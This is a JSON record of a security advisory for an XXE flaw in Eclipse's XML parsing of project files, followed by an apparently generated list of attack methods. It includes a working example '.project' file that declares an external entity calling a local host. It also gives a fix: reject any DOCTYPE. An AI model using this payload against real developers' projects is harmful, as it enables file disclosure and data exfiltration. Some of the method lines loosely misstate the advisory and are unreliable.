{"description": "### Impact\nxml files like \".project\" are parsed vulnerable against all sorts of XXE attacks. The user just needs to open any evil project or update an open project with a vulnerable file (for example for review  a foreign repository or patch).\n\nVulnerablility was found by static code analysis (SonarLint).\n\nExample `.project` file:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE price [\n<!ENTITY xxe SYSTEM \"http://127.0.0.1:49416/evil\">]>\n<projectDescription>\n\t<name>p</name>\n\t<comment>&xxe;</comment>\n</projectDescription>\n```\n\n### Patches\nSimilar patches including junit test that shows the vulnerability have already applied to PDE (see https://github.com/eclipse-pde/eclipse.pde/pull/667). A solution to platform should be the same: just reject parsing any XML that contains any `DOCTYPE`.\n\n### Workarounds\nNo known workaround. User can only avoid to get/open any foreign files with eclipse. Firewall rules against loss of data (but not against XML bomb).\n\n### References\nhttps://cwe.mitre.org/data/definitions/611.html\nhttps://rules.sonarsource.com/java/RSPEC-2755\nhttps://gitlab.eclipse.org/security/vulnerability-reports/-/issues/8 (Report for multiple projects affected)\n\n", "methods": ["Uses XML External Entity (XXE) attacks through parsing of vulnerable XML files.", "Uses malicious XML files to exploit XXE vulnerabilities.", "Uses XML files like \".project\" to carry out XXE attacks.", "Uses HTTP requests to a malicious server to execute XXE attacks.", "Uses a malicious server to send malicious XML files to the victim."]}